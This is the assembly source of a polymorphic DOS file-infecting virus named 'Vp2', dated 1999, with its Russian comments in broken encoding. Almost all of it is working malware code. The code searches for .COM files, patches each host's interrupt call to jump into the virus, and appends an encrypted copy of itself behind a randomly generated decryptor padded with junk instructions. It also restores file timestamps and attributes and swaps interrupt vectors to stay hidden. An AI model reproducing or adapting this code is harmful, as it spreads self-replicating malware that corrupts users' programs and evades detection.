   ;‚¨àãá Vp2 09.07.1999 (c) CrkV
   ;¨á¯®«ì§ã¥â ç áâì à §à ¡®âª¨ [CVME] ;-)))

   VP1 EQU 'V'
   VP2 EQU '+'
   VP  EQU VP1 Shl 8 + VP2

   DOSInt  EQU 03h

   Int21h  EQU Int DOSInt

   .model tiny
   .code
   .286
       Org 100h
   VirVp2:
       Call    $ + 3
       PushF               ;ä« £¨ â®¦¥ c®åà ¨¬
       PushA               ;á®åà ¨¬ ¢á¥ à¥£¨áâàë
       Push    Ds
   Entry_Point:

       Call    $+3
   My_Point:
           Mov Bp,Sp
           Sub Word Ptr [Bp+22],03h
       Mov Di,[Bp+22]      ;¯®«ãç¨âì  ¤à¥á ¢®§¢à â 
       Pop Bp                      ;Bp:=Offset My_Point

       Push    Es

       Mov Ax,3521h
       Int 21h

       Mov Ds:[Bp+Ofs21h],Bx
       Mov Ds:[Bp+Seg21h],Es

       Push    Es
       Push    Bx

       Mov Ds:[Bp+Save_Sp],Sp
       Mov Ds:[Bp+Save_Ss],Ss

       Push    Cs
       Push    Cs
       Pop Es
       Pop Ss          ;Cli ¥ ã¦¥
       Lea Sp,[Bp+Vir_Stack]

       Lea Si,[Bp+Save_Byte]
       Cld
       MovSW
       MovSB

       Mov Ah,25h
       Lea Dx,[Bp+My_Int21h]
       Int 21h

       Call    Set_Int21h
       Mov Ah,2Fh Xor VP1      ;Get DTA
       Int21h

   ;   Add Si,Save_DTA
       LodSW

       Mov [Si],Bx         ;‘®åà ï¥¬ DTA
       Mov [Si+02h],Es

       Push    Cs
       Pop Es

       Mov Ah,1Ah Xor VP1      ;Set DTA
       Lea Dx,[Bp+New_DTA]
       Int21h              ;ãáâ  ¢«¨¢ ¥¬ á¢®î DTA

       Mov Ah,4Eh Xor VP1      ;Find_First
       Mov Cx,0FEh
       Lea Dx,[Bp+Mask_Com]

   @Find_File:
       Int21h
       Jnc @Check_File
       LDs Dx,[Bp+Save_DTA2]
       Mov Ah,1Ah Xor VP1      ;Set DTA
       Int21h              ;‚®ááâ  ¢«¨¢ ¥¬ ¯à®£à ¬¬ãî DTA
       Call    Set_Int21h
       Cli
       Mov Sp,[Bp+Save_Sp]
       Mov Ss,[Bp+Save_Ss]
       Pop Dx
       Pop Ds
       Mov Ax,2521h Xor VP
       Int 21h
       Pop Es
       Pop Ds
       PopA                ;‚®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë
       PopF
       Ret             ;‚ëå®¤¨¬ ¨§ ¢¨àãá 

   ;---------------------------------------
   @Check_File:
       Mov Ax,4301h Xor VP     ;Set Atr
       Lea Dx,[Bp+New_DTA+1Eh] ; ©¤¥®¥ ¨¬ï ¢ DTA
       Sub Cx,Cx
       Int21h
       Jc  @Not_Infected
       Mov Ax,3D02h Xor VP     ;Open File
       Int21h
       Jc  @Exit_Check
       Xchg    Bx,Ax           ;Bx:=Ax (File Handle)
       Call    Set_FP          ;  ¢ëå®¤¥ Dx:Ax - à §¬¥à ä ©« 

       Or  Dx,Dx
       Jnz @Not_Infected
       Cmp Ax,0100h
       Jbe @Not_Infected       ;ä ©« ¬ «®¢ â
       Cmp Ax,0F000h
       Jnb @Not_Infected       ;  ¢®â íâ®â ¢¥«¨ª ;-))

       Mov Di,Ax
       Dec Ax
       Dec Ax
       Xchg    Dx,Ax
       Mov Al,00h Xor VP2
       Call    Set_FP2         ;ãáâ  ¢«¨¢ ¥¬ ãª.   ª®¥æ ä ©«  - 2
       Mov Ah,3Fh Xor VP1      ;Read File
       Lea Si,[Bp+Buffer]
       Mov Dx,Si
       Mov Cl,02h
       Int21h              ;‘ç¨â ¥¬ 2 ¡ ©â 
       Cmp Word Ptr [Si],'+V'  ;V+ - ¬¥âª  ¢¨àãá 
       Je  @Not_Infected       ;¢®§¬®¦® § à ¦¥
       Mov Al,00h Xor VP2
       Call    Set_FP1
       Call    Infect
   @Not_Infected:
       Mov Ah,3Eh Xor VP1      ;Close File
       Int21h
       Mov Ax,4301h Xor VP     ;Set Atr
       Lea Dx,[Bp+New_DTA+1Eh] ; ©¤¥®¥ ¨¬ï ¢ DTA
       Sub Cx,Cx
       Mov Cl,[Bp+New_DTA+15h] ; âà¨¡ãâë ¨§ DTA
       Int21h
       Mov Ax,5701h Xor VP     ;Set File Time
       Mov Cx,[Bp+New_DTA+16h] ;¢à¥¬ï
       Mov Dx,[Bp+New_DTA+18h] ;¤ â 
       Int21h
   @Exit_Check:
       Mov Ah,4Fh Xor VP1      ;Find Next
       Jmp @Find_File
   ;---------------------------------------
   Set_FP: Mov Al,02h Xor VP2
   Set_FP1:Sub Dx,Dx
   Set_FP2:Sub Cx,Cx
       Mov Ah,42h Xor VP1
       Int21h
       Ret
   ;---------------------------------------
   Infect  Proc
       Push    Di
       Mov Ah,3Fh Xor VP1      ;Read File
       Mov Ch,01h          ;Cl=0
       Mov Dx,Si
       Int21h              ;‘ç¨âë¢ ¥¬ 256 ¡ ©â
       LodSW

       Cmp Ax,'ZM'
       Je  @Exit_Infect2
       Cmp Ax,'MZ'
       Je  @Exit_Infect2

       Cmp Al,0EBh         ;Jmp short ?
       Je  @Jmp_Short

       Dec Si
       Cmp Al,0E9h         ;Jmp ?
       Je  @Ok_Jmp

       Push    0
       Dec Si
       Jmp @Not_Jmp

   @Jmp_Short:
       LodSB
       Cbw
       Jmp @Jmps


   @Ok_Jmp:
       LodSW
       Dec Si

   @Jmps:
       Push    Ax
       Xchg    Dx,Ax
       Dec Si
       Dec Si
       Mov Al,00h Xor VP2
       Call    Set_FP2
       Mov Ah,3Fh Xor VP1      ;Read File
       Mov Ch,01h
       Mov Dx,Si
       Int21h              ;‘ç¨â ¥¬ 256 ¡ ©â ®â ¯¥à¥å®¤ 
   @Not_Jmp:

       Mov Di,Si

   @Next_Scan:
       Mov Al,0CDh
       Repne   ScasB
       Jz  @Ok_Scan

   @Exit_Infect:
       Pop Di
   @Exit_Infect2:
       Pop Di
       Ret

   @Ok_Scan:
       Mov Ax,[Di]
       Cmp Al,10h
       Je  @Now_Infected
       Cmp Al,20h
       Je  @Now_Infected
       Cmp Al,21h
       Je  @Now_Infected
       Cmp Al,27h
       Jnz @Next_Scan

   @Now_Infected:

       Mov [Bp+Save_Byte+1],Ax
       Lea Dx,[Di-Buffer-1]
       Sub Dx,Bp
       Pop Ax
       Add Dx,Ax
       Push    Dx
       Mov Al,00h Xor VP2
       Call    Set_FP2         ;âãâ ¡ã¤¥â ¯¥à¥å®¤   â¥«® ¢¨àãá 
       Pop Dx
       Pop Ax          ;* §¬¥à
       Push    Bx
       Push    Ax
       Sub Ax,Dx
       Sub Ax,03h          ;¢ëç¨á«ï¥¬ á¬¥é¥¨¥ ¤«ï Call ¢¨àãá
       Mov Byte Ptr [Di-1],0E8h    ;Call My_Point
       Mov Dx,Di
       Dec Dx
       StoSW
       Mov Ah,40h Xor VP1      ;Write File
       Mov Cx,03h
       Int21h              ;‡ ¯¨á «¨ ª®¬ ¤ã ¯¥à¥å®¤ 
       Call    Set_FP

       Mov Di,Si           ;*ãä¥à
       Mov Ax,609Ch
       StoSW
       Mov Dl,00110000b
       Call    Reg_Musor
       Mov Al,1Eh          ;Push Ds
       Call    Com_Musor
       Mov Al,0Eh          ;Push Cs
       Call    Com_Musor
       Mov Al,1Fh          ;Pop Ds
       Call    Com_Musor

       In  Ax,40h
       Xchg    Ah,Al
       Shr Ax,1
       Xchg    Cx,Ax
       Mov Dl,00110111b            ;Bx,Si,Di
       Call    GetFrRS         ;à¥£¨áâà ¡ §ë
       And Dl,11111000b        ;Sp - ¥ ¨á¯®«ì§ã¥¬
       Push    Cx
       Push    Ax
       Call    LoadReg
       Call    Reg_Musor
       Call    @LeaTabBI

   TabBI   db  0,0,0,9Fh,0,0,0B4h,0BDh

   @LeaTabBI:
       Pop Bx
       Mov Cx,Ax
       Xlat
       Xchg    Cx,Ax
       Call    Rand04
       Mov Ah,Cl
       Cmp Al,01h
       Jb  @R_Xor
       Je  @R_Add
       Mov Al,29h
       Mov Cl,01h
       Jmp @R_Sub
   @R_Add: Mov Al,01h
       Mov Cl,29h
       Jmp @R_Sub
   @R_Xor: Mov Al,31h
       Mov Cl,31h
   @R_Sub: Mov [Bp+Rnd_Com],Cl
       Mov Cx,Di
       StoSW
       Pop Ax          ;à¥£¨áâà
       Push    Di
       StoSW
       Call    Reg_Musor
       Or  Al,01000000b        ;Inc
       StoSB
       Call    Reg_Musor
       Mov Ah,81h          ;Cmp
       StoSW
       Or  Al,11111000b
       StoSB
       Push    Di          ;§ ç¥¨¥
       Mov Al,75h          ;Jne
       StoSW
       Call    Reg_Musor
       StoSW
       Sub Cx,Di
       Mov [Di-1],Cl
       Sub Di,Si           ;à §¬¥à 1 ç áâ¨
       Mov Cx,Di
       Push    Bp
       Mov Bp,Sp
       Add Di,[Bp+8]       ;à §¬¥à ¯à®£¨
       Sub Di,[Bp+6]       ;à ¤®¬®¥ § ç¥¨¥
       Add Di,100h
       Mov Bx,[Bp+4]
       Mov [Bx],Di
       Mov Di,[Bp+6]
       Mov Bx,[Bp+2]
       Add Di,Shifr_Lenght
       Mov [Bx],Di
       Mov Di,[Bp+6]
       Pop Bp
       Add Sp,8
       Pop Bx
       Mov Ah,40h Xor VP1
       Mov Dx,Si
       Int21h

       Push    Bx
       Push    Di
       Mov Cx,Vir_Lenght
       Mov Di,Dx
       Lea Si,[Bp-3]
       Repe    MovSB
       Pop Bx
       Mov Si,Dx
       Mov Di,Dx
       Mov Cx,(Shifr_Lenght) Shr 1

   @LoopSh:LodSW
   Rnd_Com EQU $ - Offset My_Point
       Xor Bx,Ax
       Inc Bx
       Inc Bx
       StoSW
       Loop    @LoopSh

       Pop Bx
       Mov Cx,Vir_Lenght
       Mov Ah,40h Xor VP1      ;Write_File
       Int21h              ;„®¯¨á «¨ ¢¨àãá
       Ret
   Infect  EndP
   ;---------------------------------------
   Set_Int21h  Proc
       Push    Ds
       Push    0
       Pop Ds
       Cli
       Mov Ax,Ds:[DOSInt*4]    ;Int 03h
       Xchg    Ax,Ds:[21h*4]
       Mov Ds:[DOSInt*4],Ax
       Mov Ax,Ds:[DOSInt*4][2] ;Int 03h
       Xchg    Ax,Ds:[21h*4][2]
       Mov Ds:[DOSInt*4][2],Ax
       Sti
       Pop Ds
       Ret
   Set_Int21h  EndP
   ;---------------------------------------
   My_Int21h   EQU $ - Offset My_Point
       Xor Ax,VP
       db  0EAh
   Ofs21h      EQU $ - Offset My_Point
       dw  ?
   Seg21h      EQU $ - Offset My_Point
       dw  ?
   ;---------------------------------------
   .386
   GetFrR  Proc

   ;(‚ëå) Al - á¢®¡®¤ë© à¥£¨áâà

   @NextR: Call    Rand08
       Bt  Dx,Ax
       Jc  @NextR          ;*¥£¨áâà ã¦¥ ¨á¯®«ì§ã¥âáï
       Ret
   GetFrR  Endp
   ;---------------------------------------
   GetFrRS Proc

   ;(‚ëå) Al - á¢®¡®¤ë© à¥£¨áâà (®¡êï¢«ï¥âáï § ïâë¬)

   @NextRS:Call    Rand08
       Bts Dx,Ax
       Jc  @NextRS         ;*¥£¨áâà ã¦¥ ¨á¯®«ì§ã¥âáï
       Ret
   GetFrRS Endp
   .286
   ;---------------------------------------
   Rand04  Proc
       In  Ax,40h
       And Ax,11b
       Ret
   Rand04  EndP
   ;---------------------------------------
   Rand08  Proc
       In  Al,40h
       And Ax,111b
       Ret
   Rand08  EndP
   ;---------------------------------------
   LoadReg Proc
   ;£¥¥à¨àã¥â ª®¬ ¤ã(ë) § £àã§ª¨ à¥£¨áâà 
   ;Ax - ¨á¯®«ì§ã¥¬ë© à¥£¨áâà
   ;Cx - § ç¥¨¥
   ;Es:Di - ¡ãä¥à

   ;  ¢ëå®¤¥: Es:Di - ¡ãä¥à ¤«ï ®¢®© ª®¬ ¤ë

       Push    Ax
       In  Ax,40h
       Test    Al,100b
       Pop Ax
       Je  LM1

   ;---------------------------
   LM0 Proc

   ;ª®¬ ¤  Mov Rg16,Im

       Push    Ax
       Or  Al,10111000b        ;Mov Rg16,Im
       StoSB
       Xchg    Cx,Ax
       StoSW
       Xchg    Cx,Ax
       Pop Ax
       Ret
   LM0 Endp
   ;---------------------------
   LM1 Proc

   ;ª®¬ ¤ë Push Im16
   ;        ¥áª®«ìª® ¬ãá®à 
   ;        Pop R16

       Push    Ax
       Or  Al,01011000b        ;Pop R16
       Push    Ax
       Mov Al,68h          ;Push Im16
       StoSB
       Xchg    Cx,Ax
       StoSW
       Xchg    Cx,Ax
       Pop Ax
       StoSB
       Pop Ax
       Ret
   LM1 Endp
   ;---------------------------

   LoadReg Endp
   ;---------------------------------------
   Com_Musor:
       StoSB
   ;---------------------------------------
   Reg_Musor   Proc
       Push    Ax
       Push    Cx
       Call    Rand04
       Xchg    Cx,Ax
       JCxz    @ExitRM
   @LoopRM:Push    Cx
       In  Ax,40h
       Xchg    Ah,Al
       In  Al,40h
       Xchg    Cx,Ax
       Call    GetFrR
       Call    LoadReg
       Pop Cx
       Loop    @LoopRM
   @ExitRM:Pop Cx
       Pop Ax
       Ret
   Reg_Musor   EndP
   ;---------------------------------------
   Mask_Com    EQU $ - Offset My_Point

       db  '*.com',00h

   Save_Byte   EQU $ - Offset My_Point
       db  0CDh
       db  20h

   Shifr_Lenght    EQU (($ - Entry_Point) Shr 1) Shl 1

       db  ?
   StrVp   db  'V+'

   Vir_Lenght  EQU $ - Offset Entry_Point
   ;---------------------------------------
   Vir_Stack   EQU $ - Offset Entry_Point + 800h
   ;---------------------------------------
   Save_Dta2   EQU $ - Offset My_Point
       dd  ?
   Save_Sp     EQU $ - Offset My_Point
       dw  ?
   Save_Ss     Equ $ - Offset My_Point
       dw  ?
   RndZn   dw  ?
   New_DTA     EQU $ - Offset My_Point

   Buffer      EQU Vir_Lenght + 100h
   ;---------------------------------------
       End VirVp2
